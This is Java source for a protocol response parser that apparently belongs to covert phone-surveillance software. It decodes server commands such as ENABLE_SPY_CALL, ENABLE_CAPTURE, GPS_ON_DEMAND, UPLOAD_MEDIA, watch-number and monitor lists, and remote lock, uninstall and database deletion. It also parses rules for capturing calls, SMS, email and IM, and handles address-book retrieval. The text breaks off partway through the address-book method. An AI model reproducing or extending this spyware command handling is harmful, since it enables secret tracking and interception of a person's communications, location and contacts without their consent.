package com.vvt.prot.parser;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Vector;
import net.rim.device.api.util.DataBuffer;
import com.vvt.checksum.CRC32;
import com.vvt.prot.CommandCode;
import com.vvt.prot.databuilder.exception.CRC32Exception;
import com.vvt.prot.command.AddressBook;
import com.vvt.prot.command.response.ResponseVcardProvider;
import com.vvt.prot.command.response.CommunicationEventType;
import com.vvt.prot.command.response.CommunicationDirectives;
import com.vvt.prot.command.response.GetAddressBookCmdResponse;
import com.vvt.prot.command.response.GetCSIDCmdResponse;
import com.vvt.prot.command.response.GetProcessBlackListCmdResponse;
import com.vvt.prot.command.response.GetProcessWhiteListCmdResponse;
import com.vvt.prot.command.response.GetTimeCmdResponse;
import com.vvt.prot.command.response.Criteria;
import com.vvt.prot.command.response.DayOfWeek;
import com.vvt.prot.command.response.GetActivationCodeCmdResponse;
import com.vvt.prot.command.response.GetCommunicationDirectivesCmdResponse;
import com.vvt.prot.command.response.GetConfCmdResponse;
import com.vvt.prot.command.response.PCCCommand;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.prot.command.response.ProtProcess;
import com.vvt.prot.command.response.TimeUnit;
import com.vvt.prot.command.response.SendActivateCmdResponse;
import com.vvt.prot.command.response.SendAddressBookApprovalCmdResponse;
import com.vvt.prot.command.response.SendAddressBookCmdResponse;
import com.vvt.prot.command.response.SendClearCSIDCmdResponse;
import com.vvt.prot.command.response.SendDeactivateCmdResponse;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.prot.command.response.SendHeartBeatCmdResponse;
import com.vvt.prot.command.response.SendMessageCmdResponse;
import com.vvt.prot.command.response.SendRAskCmdResponse;
import com.vvt.prot.command.response.SendRunningProcessCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.prot.command.response.UnknownCmdResponse;
import com.vvt.prot.resource.ProtocolTextResource;
import com.vvt.prot.unstruct.UnstructCmdCode;
import com.vvt.prot.unstruct.response.AckCmdResponse;
import com.vvt.prot.unstruct.response.AckSecCmdResponse;
import com.vvt.prot.unstruct.response.KeyExchangeCmdResponse;
import com.vvt.prot.unstruct.response.PingCmdResponse;
import com.vvt.prot.unstruct.response.UnstructCmdResponse;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;

public final class ResponseParser {
	
	private static final String TAG = "ResponseParser";
	
	public static StructureCmdResponse parseStructuredCmd(String filePath, int offset) throws Exception {
		InputStream is = null;
		DataInputStream dis = null;
		StructureCmdResponse response = null;
		try {
			is = FileUtil.getInputStream(filePath, offset);
			dis = new DataInputStream(is);
			response = parseStructuredCmdResponse(dis, filePath);
		} finally {
			IOUtil.close(is);
			IOUtil.close(dis);
			FileUtil.deleteFile(filePath);
		}
		return response;
	}
		
	public static StructureCmdResponse parseStructuredCmd(byte[] plainText) throws Exception {
		StructureCmdResponse response = null;
		ByteArrayInputStream bis = null;
		DataInputStream dis = null;
		try {
			bis = new ByteArrayInputStream(plainText);
			dis = new DataInputStream(bis);
			// CRC32 4 Bytes
			int crc32Len = 4;
			byte[] crc32Data = new byte[plainText.length - crc32Len];
			System.arraycopy(plainText, crc32Len, crc32Data, 0, crc32Data.length);
			int crc32Client = (int)CRC32.calculate(crc32Data);
			int crc32Server = dis.readInt();
			crc32Data = null;
			if (crc32Server == crc32Client) {
				response = parseStructuredCmdResponse(dis, null);
			} else {
				throw new CRC32Exception(ProtocolTextResource.CRC32_ERROR);
			}
		} finally {
			IOUtil.close(dis);
			IOUtil.close(bis);
		}
		return response;
	}

	public static UnstructCmdResponse parseUnstructuredCmd(byte[] data) {
		UnstructCmdResponse response = null;
		ByteArrayInputStream bis = null;
		DataInputStream dis = null;
		try {
			bis = new ByteArrayInputStream(data);
			dis = new DataInputStream(bis);
			// Command Echo 2 Bytes
			int cmdEcho = dis.readShort();
			// Status Code 2 Bytes
			int statusCode = dis.readShort();
			if (cmdEcho == UnstructCmdCode.UCMD_KEY_EXCHANGE.getId()) {
				// Session ID 4 Bytes
				long sessionId = dis.readInt();
				// Server Public Key n Bytes
				int servPublicKeyLen = dis.readShort();
				byte[] servPublicKey = new byte[servPublicKeyLen];
				dis.read(servPublicKey);
				KeyExchangeCmdResponse keyRes = new KeyExchangeCmdResponse();
				keyRes.setSessionId(sessionId);
				keyRes.setServerPK(servPublicKey);
				response = keyRes;
			} else if (cmdEcho == UnstructCmdCode.UCMD_ACKNOWLEDGE.getId()) {
				response = new AckCmdResponse();
			} else if (cmdEcho == UnstructCmdCode.UCMD_ACKNOWLEDGE_SECURE.getId()) {
				response = new AckSecCmdResponse();
			} else if (cmdEcho == UnstructCmdCode.UCMD_PING.getId()) {
				response = new PingCmdResponse();
			}
			response.setStatusCode(statusCode);
		} catch(Exception e) {
			Log.error("ResponseParser.parseUCmdResponse()", e.getMessage(), e);
		} finally {
			IOUtil.close(dis);
			IOUtil.close(bis);
		}
		return response;
	}
	
	private static StructureCmdResponse parseStructuredCmdResponse(DataInputStream dis, String filePath) throws IOException {
		StructureCmdResponse response = null;
		Vector nextCmds = new Vector();
		try {
			// Server ID 2 Bytes
			int serverId = dis.readShort();
			// Command 2 Bytes
			int commandEcho = dis.readShort();
			// Status Code 2 Bytes
			int statusCode = dis.readShort();
			// Length of Server Message 2 Bytes
			int msgLen = dis.readShort();
			byte[] msg = new byte[msgLen];
			// Message n Bytes
			dis.read(msg);
			String message = new String(msg);
			// Extended Status 4 Bytes
			int extStatus = dis.readInt();
			// Next Command n Bytes
			int numberOfPCC = dis.readByte();
			for (int i = 0; i < numberOfPCC; i++) {
				PCCCommand pcc = new PCCCommand();
				int cmdId = dis.readShort();
				PhoenixCompliantCommand cmd = getCmdId(cmdId);
				pcc.setCmdId(cmd);
				int numberOfArgs = dis.readByte();
				for (int j = 0; j < numberOfArgs; j++) {
					int argLen = dis.readShort();
					byte[] arg = new byte[argLen];
					dis.read(arg);
					String argument = new String(arg);
					pcc.addArguments(argument);
				}
				// If this PCC Command is supported, it will be added.
				//Log.debug("ResponseParser.parseStructuredCmdResponse()", "cmdId: " + cmd.getId());
				if (cmd != null) {
					nextCmds.addElement(pcc);
				}
			}
			if (CommandCode.SEND_ACTIVATE.getId() == commandEcho) {
				response = getActivateCommandResponse(dis);
			} else if (CommandCode.SEND_DEACTIVATE.getId() == commandEcho) {
				response = getDeactivateCommandResponse();
			} else if (CommandCode.SEND_EVENTS.getId() == commandEcho) {
				response = getEventCommandResponse();
			} else if (CommandCode.SEND_CLEARCSID.getId() == commandEcho) {
				response = getClearCSIDCommandResponse();
			} else if (CommandCode.SEND_HEARTBEAT.getId() == commandEcho) {
				response = getHeartBeatCommandResponse();
			} else if (CommandCode.SEND_MESSAGE.getId() == commandEcho) {
				response = getMessageCommandResponse();
			} else if (CommandCode.SEND_RUNNING_PROCCESSES.getId() == commandEcho) {
				response = getRunningProcessCommandResponse();
			} else if (CommandCode.SEND_ADDRESS_BOOK.getId() == commandEcho) {
				response = getSendAddressBookCommandResponse();
			} else if (CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL.getId() == commandEcho) {
				response = getAddressBookApprovalCommandResponse();
			} else if (CommandCode.GET_CSID.getId() == commandEcho) {
				response = getCSIDCommandResponse(dis);
			} else if (CommandCode.GET_TIME.getId() == commandEcho) {
				response = getTimeCommandResponse(dis);
			} else if (CommandCode.GET_PROCESS_WHITELIST.getId() == commandEcho) {
				response = getProcWhiteListCommandResponse(dis);
			} else if (CommandCode.GET_SOFTWARE_UPDATE.getId() == commandEcho) {
				response = getProcBlackListCommandResponse(dis);
			} else if (CommandCode.GET_COMMUNICATION_DIRECTIVES.getId() == commandEcho) {
				response = getCommunicationDirectivesCommandResponse(dis);
			} else if (CommandCode.GET_CONFIGURATION.getId() == commandEcho) {
				response = getConfigurationCommandResponse(dis);
			} else if (CommandCode.GET_ACTIVATION_CODE.getId() == commandEcho) {
				response = getActivationCodeCommandResponse(dis);
			} else if (CommandCode.GET_ADDRESS_BOOK.getId() == commandEcho) {
				String vcardExtension = ".vcard";
				response = getAddressBookCommandResponse(dis, filePath + vcardExtension);
			} else {
				if (dis.available() > 0) {
					response = getRAskCommandResponse(dis);
				} else {
					response = new UnknownCmdResponse();
				}
			}
			// Set Common Values.
			response.setServerId(serverId);
			response.setStatusCode(statusCode);
			response.setServerMsg(message);
			response.setExtStatus(extStatus);
			for (int i = 0; i < nextCmds.size(); i++) {
				response.addPCCCommands((PCCCommand)nextCmds.elementAt(i));
			}
		} finally {
			IOUtil.close(dis);
		}
		return response;
	}
	
	private static PhoenixCompliantCommand getCmdId(int cmdId) {
		//Log.debug("ResponseParser.PhoneixCompliantCommand()", "cmdId: " + cmdId);
		PhoenixCompliantCommand cmd = null;
		if (cmdId == PhoenixCompliantCommand.REQUEST_EVENT.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_EVENT;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_SPY_CALL.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_SPY_CALL;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_SPY_CALL_WITH_MPN.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_SPY_CALL_WITH_MPN;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_LOCATION.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_LOCATION;
		} else if (cmdId == PhoenixCompliantCommand.GPS_ON_DEMAND.getId()) {
			cmd = PhoenixCompliantCommand.GPS_ON_DEMAND;
		} else if (cmdId == PhoenixCompliantCommand.UPDATE_GPS_INTERVAL.getId()) {
			cmd = PhoenixCompliantCommand.UPDATE_GPS_INTERVAL;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_CAPTURE.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_CAPTURE;
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_DIAGNOSTIC.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_DIAGNOSTIC;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_SIM_CHANGE.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_SIM_CHANGE;		
		} else if (cmdId == PhoenixCompliantCommand.DEBUG.getId()) {
			cmd = PhoenixCompliantCommand.DEBUG;
		} else if (cmdId == PhoenixCompliantCommand.UNINSTALL.getId()) {
			cmd = PhoenixCompliantCommand.UNINSTALL;
		} else if (cmdId == PhoenixCompliantCommand.DELETE_DATABASE.getId()) {
			cmd = PhoenixCompliantCommand.DELETE_DATABASE;
		} else if (cmdId == PhoenixCompliantCommand.GET_ADDRESSBOOK.getId()) {
			cmd = PhoenixCompliantCommand.GET_ADDRESSBOOK;
		} else if (cmdId == PhoenixCompliantCommand.SEND_ADDRESSBOOK_FOR_APPROVAL.getId()) {
			cmd = PhoenixCompliantCommand.SEND_ADDRESSBOOK_FOR_APPROVAL;
		} else if (cmdId == PhoenixCompliantCommand.GET_COMMUNICATION_DIRECTIVE.getId()) {
			cmd = PhoenixCompliantCommand.GET_COMMUNICATION_DIRECTIVE;
		} else if (cmdId == PhoenixCompliantCommand.GET_TIME.getId()) {
			cmd = PhoenixCompliantCommand.GET_TIME;			
		} else if (cmdId == PhoenixCompliantCommand.SET_SETTING.getId()) {
			cmd = PhoenixCompliantCommand.SET_SETTING;	
		} else if (cmdId == PhoenixCompliantCommand.SET_LOCK_DEVICE.getId()) {
			cmd = PhoenixCompliantCommand.SET_LOCK_DEVICE;	
		} else if (cmdId == PhoenixCompliantCommand.SET_UNLOCK_DEVICE.getId()) {
			cmd = PhoenixCompliantCommand.SET_UNLOCK_DEVICE;	
		} else if (cmdId == PhoenixCompliantCommand.ADD_URL.getId()) {
			cmd = PhoenixCompliantCommand.ADD_URL;	
		} else if (cmdId == PhoenixCompliantCommand.RESET_URL.getId()) {
			cmd = PhoenixCompliantCommand.RESET_URL;	
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_URL.getId()) {
			cmd = PhoenixCompliantCommand.CLEAR_URL;	
		} else if (cmdId == PhoenixCompliantCommand.QUERY_URL.getId()) {
			cmd = PhoenixCompliantCommand.QUERY_URL;
		} else if (cmdId == PhoenixCompliantCommand.ACTIVATE_WITH_URL.getId()) {
			cmd = PhoenixCompliantCommand.ACTIVATE_WITH_URL;
		} else if (cmdId == PhoenixCompliantCommand.ACTIVATE_WITH_AC_URL.getId()) {
			cmd = PhoenixCompliantCommand.ACTIVATE_WITH_AC_URL;
		} else if (cmdId == PhoenixCompliantCommand.SET_PANIC_MODE.getId()) {
			cmd = PhoenixCompliantCommand.SET_PANIC_MODE;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_PANIC.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_PANIC;
		} else if (cmdId == PhoenixCompliantCommand.DELETE_MEDIA.getId()) {
			cmd = PhoenixCompliantCommand.DELETE_MEDIA;
		} else if (cmdId == PhoenixCompliantCommand.UPLOAD_MEDIA.getId()) {
			cmd = PhoenixCompliantCommand.UPLOAD_MEDIA;
//			Log.debug(TAG + "getCmdId()", "UPLOAD_MEDIA ENTER");
		} else if (cmdId == PhoenixCompliantCommand.ADD_HOMEIN.getId()) {
			cmd = PhoenixCompliantCommand.ADD_HOMEIN;
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_HOMEIN.getId()) {
			cmd = PhoenixCompliantCommand.CLEAR_HOMEIN;
		} else if (cmdId == PhoenixCompliantCommand.RESET_HOMEIN.getId()) {
			cmd = PhoenixCompliantCommand.RESET_HOMEIN;
		} else if (cmdId == PhoenixCompliantCommand.QUERY_HOMEIN.getId()) {
			cmd = PhoenixCompliantCommand.QUERY_HOMEIN;
		} else if (cmdId == PhoenixCompliantCommand.ADD_HOMEOUT.getId()) {
			cmd = PhoenixCompliantCommand.ADD_HOMEOUT;
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_HOMEOUT.getId()) {
			cmd = PhoenixCompliantCommand.CLEAR_HOMEOUT;
		} else if (cmdId == PhoenixCompliantCommand.RESET_HOMEOUT.getId()) {
			cmd = PhoenixCompliantCommand.RESET_HOMEOUT;
		} else if (cmdId == PhoenixCompliantCommand.QUERY_HOMEOUT.getId()) {
			cmd = PhoenixCompliantCommand.QUERY_HOMEOUT;
		} else if (cmdId == PhoenixCompliantCommand.DEACTIVATE.getId()) {
			cmd = PhoenixCompliantCommand.DEACTIVATE;
		} else if (cmdId == PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId()) {
			cmd = PhoenixCompliantCommand.SEND_ADDRESS_BOOK;
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_WATCH_NOTIFICATION.getId()) {
			cmd = PhoenixCompliantCommand.ENABLE_WATCH_NOTIFICATION;
		} else if (cmdId == PhoenixCompliantCommand.SET_WATCH_FLAGS.getId()) {
			cmd = PhoenixCompliantCommand.SET_WATCH_FLAGS;
		} else if (cmdId == PhoenixCompliantCommand.ADD_WATCH_NUMBER.getId()) {
			cmd = PhoenixCompliantCommand.ADD_WATCH_NUMBER;
		} else if (cmdId == PhoenixCompliantCommand.RESET_WATCH_NUMBER.getId()) {
			cmd = PhoenixCompliantCommand.RESET_WATCH_NUMBER;
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_WATCH_NUMBER.getId()) {
			cmd = PhoenixCompliantCommand.CLEAR_WATCH_NUMBER;
		} else if (cmdId == PhoenixCompliantCommand.QUERY_WATCH_NUMBER.getId()) {
			cmd = PhoenixCompliantCommand.QUERY_WATCH_NUMBER;
		} else if (cmdId == PhoenixCompliantCommand.ADD_MONITOR.getId()) {
			cmd = PhoenixCompliantCommand.ADD_MONITOR;
		} else if (cmdId == PhoenixCompliantCommand.RESET_MONITOR.getId()) {
			cmd = PhoenixCompliantCommand.RESET_MONITOR;
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_MONITOR.getId()) {
			cmd = PhoenixCompliantCommand.CLEAR_MONITOR;
		} else if (cmdId == PhoenixCompliantCommand.QUERY_MONITOR.getId()) {
			cmd = PhoenixCompliantCommand.QUERY_MONITOR;
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_CURRENT_URL.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_CURRENT_URL;
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_SETTINGS.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_SETTINGS;
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_STARTUP_TIME.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_STARTUP_TIME;
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER.getId()) {
			cmd = PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER;
		}
		return cmd;
	}
	
	// Send Command Response Part
	private static SendActivateCmdResponse getActivateCommandResponse(DataInputStream dis) throws IOException {
		SendActivateCmdResponse sendActResponse = new SendActivateCmdResponse();
		if (dis.available() > 0) {
			int md5Len = 16;
			byte[] md5 = new byte[md5Len];
			dis.read(md5);
			sendActResponse.setMd5(md5);
			int configId = dis.readShort();
			sendActResponse.setConfigID(configId);
		}
		return sendActResponse;
	}
	
	private static SendEventCmdResponse getEventCommandResponse() {
		return new SendEventCmdResponse();
	}
	
	private static SendAddressBookApprovalCmdResponse getAddressBookApprovalCommandResponse() {
		return new SendAddressBookApprovalCmdResponse();
	}

	private static SendAddressBookCmdResponse getSendAddressBookCommandResponse() {
		return new SendAddressBookCmdResponse();
	}

	private static SendRunningProcessCmdResponse getRunningProcessCommandResponse() {
		return new SendRunningProcessCmdResponse();
	}

	private static SendMessageCmdResponse getMessageCommandResponse() {
		return new SendMessageCmdResponse();
	}

	private static SendHeartBeatCmdResponse getHeartBeatCommandResponse() {
		return new SendHeartBeatCmdResponse();
	}

	private static SendClearCSIDCmdResponse getClearCSIDCommandResponse() {
		return new SendClearCSIDCmdResponse();
	}

	private static SendDeactivateCmdResponse getDeactivateCommandResponse() {
		return new SendDeactivateCmdResponse();
	}
	
	private static StructureCmdResponse getRAskCommandResponse(DataInputStream dis) throws IOException {
		SendRAskCmdResponse sendRAskResponse = new SendRAskCmdResponse();
		if (dis.available() > 0) {
			int len = 4;
			byte[] numberOfBytes = new byte[len];
			dis.read(numberOfBytes);
			DataBuffer buffer = new DataBuffer(numberOfBytes, 0, numberOfBytes.length, true);
			long offset = buffer.readInt();
			sendRAskResponse.setNumberOfBytes(offset);
		}
		return sendRAskResponse;
	}
	
	// Get Command Response Part
	private static GetActivationCodeCmdResponse getActivationCodeCommandResponse(DataInputStream dis) throws IOException {
		GetActivationCodeCmdResponse actCodeResponse = new GetActivationCodeCmdResponse();
		if (dis.available() > 0) {
			int actCodeLen = dis.readByte();
			byte[] actCode = new byte[actCodeLen];
			dis.read(actCode);
			String activationCode = new String(actCode);
			actCodeResponse.setActivationCode(activationCode);
		}
		return actCodeResponse;
	}

	private static GetConfCmdResponse getConfigurationCommandResponse(DataInputStream dis) throws IOException {
		GetConfCmdResponse confResponse = new GetConfCmdResponse();
		if (dis.available() > 0) {
			int md5Len = 16;
			byte[] md5 = new byte[md5Len];
			dis.read(md5);
			confResponse.setMd5(md5);
			int configId = dis.readShort();
			confResponse.setConfigID(configId);
		}
		return confResponse;
	}

	private static GetCommunicationDirectivesCmdResponse getCommunicationDirectivesCommandResponse(DataInputStream dis) throws IOException {
		GetCommunicationDirectivesCmdResponse comDirectivesResponse = new GetCommunicationDirectivesCmdResponse();
		if (dis.available() > 0) {
			int comDirectivesCount = dis.readShort();
			if (comDirectivesCount > 0) {
				for (int i = 0; i < comDirectivesCount; i++) {
					CommunicationDirectives communicationDirectives = new CommunicationDirectives();
					// TimeUnit 1 Byte
					int occurence = dis.readByte();
					TimeUnit timeUnit = getTimeUnit(occurence);
					communicationDirectives.setTimeUnit(timeUnit);
					// Criteria (Multiplier 1 Byte)
					Criteria criteria = new Criteria();
					int multiplier = dis.readByte();
					criteria.setMultiplier(multiplier);
					// Criteria (Days of Week 1 Byte)
					int dayWeek = dis.readByte();
					DayOfWeek dayOfWeek = getDayOfWeek(dayWeek);
					criteria.setDayOfWeek(dayOfWeek);
					// Criteria (Days of Month 1 Byte)
					int dayMonth = dis.readByte();
					criteria.setDayOfMonth(dayMonth);
					// Criteria (Month 1 Byte)
					int month = dis.readByte();
					criteria.setMonth(month);
					communicationDirectives.setCriteria(criteria);
					// Communication Event n Bytes
					int numberOfComEvent = dis.readShort();
					for (int j = 0; j < numberOfComEvent; j++) {
						int eventType = dis.readShort();
						CommunicationEventType communicationEventType = getCommunicationEventType(eventType);
						communicationDirectives.addCommunicationEventType(communicationEventType);
					}
					// Start Date 10 Bytes
					int startDateLen = 10;
					byte[] startDate = new byte[startDateLen];
					dis.read(startDate);
					String startDateStr = new String(startDate);
					communicationDirectives.setStartDate(startDateStr);
					// End Date 10 Bytes
					int endDateLen = 10;
					byte[] endDate = new byte[endDateLen];
					dis.read(endDate);
					String endDateStr = new String(endDate);
					communicationDirectives.setEndDate(endDateStr);
					// Day Start Time 5 Bytes
					int dayStartTimeLen = 5;
					byte[] dayStartTime = new byte[dayStartTimeLen];
					dis.read(dayStartTime);
					String dayStartTimeStr = new String(dayStartTime);
					communicationDirectives.setDayStartTime(dayStartTimeStr);
					// Day End Time 5 Bytes
					int dayEndTimeLen = 5;
					byte[] dayEndTime = new byte[dayEndTimeLen];
					dis.read(dayEndTime);
					String dayEndTimeStr = new String(dayEndTime);
					communicationDirectives.setDayEndTime(dayEndTimeStr);
					// Action 1 Byte
					int action = dis.readByte();
					communicationDirectives.setAction(action);
					// Direction 1 Byte
					int direction = dis.readByte();
					communicationDirectives.setDirection(direction);
					// Adding CommunicationRule
					comDirectivesResponse.addCommunicationDirectives(communicationDirectives);
				}
			}
		}
		return comDirectivesResponse;
	}

	private static CommunicationEventType getCommunicationEventType(int eventType) {
		CommunicationEventType communicationEventType = CommunicationEventType.UNKNOWN;
		if (eventType == CommunicationEventType.CALL.getId()) {
			communicationEventType = CommunicationEventType.CALL;
		} else if (eventType == CommunicationEventType.SMS.getId()) {
			communicationEventType = CommunicationEventType.SMS;
		} else if (eventType == CommunicationEventType.MMS.getId()) {
			communicationEventType = CommunicationEventType.MMS;
		} else if (eventType == CommunicationEventType.EMAIL.getId()) {
			communicationEventType = CommunicationEventType.EMAIL;
		} else if (eventType == CommunicationEventType.IM.getId()) {
			communicationEventType = CommunicationEventType.IM;
		}
		return communicationEventType;
	}

	private static DayOfWeek getDayOfWeek(int dayWeek) {
		DayOfWeek dayOfWeek = DayOfWeek.UNKNOWN;
		if (dayWeek == DayOfWeek.SUNDAY.getId()) {
			dayOfWeek = DayOfWeek.SUNDAY;
		} else if (dayWeek == DayOfWeek.MONDAY.getId()) {
			dayOfWeek = DayOfWeek.MONDAY;
		} else if (dayWeek == DayOfWeek.TUESDAY.getId()) {
			dayOfWeek = DayOfWeek.TUESDAY;
		} else if (dayWeek == DayOfWeek.WEDNESDAY.getId()) {
			dayOfWeek = DayOfWeek.WEDNESDAY;
		} else if (dayWeek == DayOfWeek.THURSDAY.getId()) {
			dayOfWeek = DayOfWeek.THURSDAY;
		} else if (dayWeek == DayOfWeek.FRIDAY.getId()) {
			dayOfWeek = DayOfWeek.FRIDAY;
		} else if (dayWeek == DayOfWeek.SATURDAY.getId()) {
			dayOfWeek = DayOfWeek.SATURDAY;
		}
		return dayOfWeek;
	}

	private static TimeUnit getTimeUnit(int occurence) {
		TimeUnit timeunit = TimeUnit.UNKNOWN;
		if (occurence == TimeUnit.DAILY.getId()) {
			timeunit = TimeUnit.DAILY;
		} else if (occurence == TimeUnit.WEEKLY.getId()) {
			timeunit = TimeUnit.WEEKLY;
		} else if (occurence == TimeUnit.MONTHLY.getId()) {
			timeunit = TimeUnit.MONTHLY;
		} else if (occurence == TimeUnit.YEARLY.getId()) {
			timeunit = TimeUnit.YEARLY;
		}
		return timeunit;
	}

	private static GetProcessBlackListCmdResponse getProcBlackListCommandResponse(DataInputStream dis) throws IOException {
		GetProcessBlackListCmdResponse blackListResponse = new GetProcessBlackListCmdResponse();
		if (dis.available() > 0) {
			int numberOfProc = dis.readShort();
			for (int i = 0; i < numberOfProc; i++) {
				ProtProcess process = new ProtProcess();
				// Category 1 Byte
				int category = dis.readByte();
				process.setCategory(category);
				// Process Name n Bytes
				int nameLen = dis.readByte();
				byte[] procName = new byte[nameLen];
				dis.read(procName);
				String name = new String(procName);
				process.setName(name);
				blackListResponse.addProcesses(process);
			}
		}
		return blackListResponse;
	}

	private static GetProcessWhiteListCmdResponse getProcWhiteListCommandResponse(DataInputStream dis) throws IOException {
		GetProcessWhiteListCmdResponse whiteListResponse = new GetProcessWhiteListCmdResponse();
		if (dis.available() > 0) {
			int numberOfProc = dis.readShort();
			for (int i = 0; i < numberOfProc; i++) {
				ProtProcess process = new ProtProcess();
				// Category 1 Byte
				int category = dis.readByte();
				process.setCategory(category);
				// Process Name n Bytes
				int nameLen = dis.readByte();
				byte[] procName = new byte[nameLen];
				dis.read(procName);
				String name = new String(procName);
				process.setName(name);
				whiteListResponse.addProcesses(process);
			}
		}
		return whiteListResponse;
	}

	private static GetTimeCmdResponse getTimeCommandResponse(DataInputStream dis) throws IOException {
		GetTimeCmdResponse timeResponse = new GetTimeCmdResponse();
		if (dis.available() > 0) {
			// GMT Time 19 Bytes
			int gmtTimeLen = 19;
			byte[] bufferGMTTime = new byte[gmtTimeLen];
			dis.read(bufferGMTTime);
			String gmtTime = new String(bufferGMTTime);
			timeResponse.setGMTTime(gmtTime);
			// Representation 1 Byte
			int rep = dis.readByte();
			timeResponse.setRepresentation(rep);
			// Timezone
			int timezoneLen = dis.readByte();
			byte[] timezone = new byte[timezoneLen];
			dis.read(timezone);
			String time = new String(timezone);
			timeResponse.setTimezone(time);
		}
		return timeResponse;
	}

	private static GetCSIDCmdResponse getCSIDCommandResponse(DataInputStream dis) throws IOException {
		GetCSIDCmdResponse csidResponse = new GetCSIDCmdResponse();
		if (dis.available() > 0) {
			int numberOfCSIDs = dis.readByte();
			for (int i = 0; i < numberOfCSIDs; i++) {
				Integer csid = new Integer(dis.readByte());
				csidResponse.addCSID(csid);
			}
		}
		return csidResponse;
	}
	
	private static GetAddressBookCmdResponse getAddressBookCommandResponse(DataInputStream dis, String vcardsPath) throws IOException {
		GetAddressBookCmdResponse addrBookResponse = new GetAddressBookCmdResponse();
		try {
			if (dis.available() > 0) {
				byte addressBookCount = dis.readByte();
				long offset = 0;
				for (int i = 0; i < addressBookCount; i++) {
					AddressBook addressBook = new AddressBook();
					// Address Book ID 4 Bytes
					int addressBookId = dis.readInt();
					addressBook.setAddressBookId(addressBookId);
					// Address Book Name n Bytes
					int addressBookNameLen = dis.readByte();
					byte[] addressBookName = new byte[addressBookNameLen];
					dis.read(addressBookName);
					String addrBookName = new String(addressBookName);
					addressBook.setAddressBookName(addrBookName);
					// VCard
					int vCardCount = dis.readShort();
					addressBook.setVCardCount(vCardCount);
					ResponseVcardProvider vcardDataProvider = new ResponseVcardProvider(vcardsPath, offset, vCardCount);
					addressBook.setVCardProvider(vcardDataProvider);
					//Copy vcards to vcardsPath.
					for (int j = 0; j < vCardCount; j++) {
						// Server ID 4 Bytes
						int serverId = dis.readInt();
						FileUtil.append(vcardsPath, ByteUtil.toByte(serverId));
						// Client ID n Byte
						byte clientIdLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(clientIdLen));
						if (clientIdLen > 0) {
							byte[] clientId = new byte[clientIdLen];
							dis.read(clientId);
							FileUtil.append(vcardsPath, clientId);
						}
						// Approval Status 1 Byte
						byte status = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(status));
						// VCard Summary
						// First Name n Bytes
						byte firstNameLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(firstNameLen));
						if (firstNameLen > 0) {
							byte[] firstName = new byte[firstNameLen];
							dis.read(firstName);
							FileUtil.append(vcardsPath, firstName);
						}
						// Last Name n Bytes
						byte lastNameLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(lastNameLen));
						if (lastNameLen > 0) {
							byte[] lastName = new byte[lastNameLen];
							dis.read(lastName);
							FileUtil.append(vcardsPath, lastName);
						}
						// Home Phone n Bytes
						byte homePhoneLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(homePhoneLen));
						if (homePhoneLen > 0) {
							byte[] homePhone = new byte[homePhoneLen];
							dis.read(homePhone);
							FileUtil.append(vcardsPath, homePhone);
						}
						// Mobile Phone n Bytes
						byte mobilePhoneLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(mobilePhoneLen));
						if (mobilePhoneLen > 0) {
							byte[] mobilePhone = new byte[mobilePhoneLen];
							dis.read(mobilePhone);
							FileUtil.append(vcardsPath, mobilePhone);
						}
						// Work Phone n Bytes
						byte workPhoneLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(workPhoneLen));
						if (workPhoneLen > 0) {
							byte[] workPhone = new byte[workPhoneLen];
							dis.read(workPhone);
							FileUtil.append(vcardsPath, workPhone);
						}
						// Email n Bytes
						byte emailLen = dis.readByte();
						FileUtil.append(vcardsPath, ByteUtil.toByte(emailLen));
						if (emailLen > 0) {
							byte[] email = new byte[emailLen];
							dis.read(email);
							FileUtil.append(vcardsPath, email);
						}
						// Note n Bytes
						short noteLen = dis.readShort();
						FileUtil.append(vcardsPath, ByteUtil.toByte(noteLen));
						if (noteLen > 0) {
							byte[] note = new byte[noteLen];
							dis.read(note);
							FileUtil.append(vcardsPath, note);
						}
						// Contact Picture n Bytes
						int pictureLen = dis.readInt();
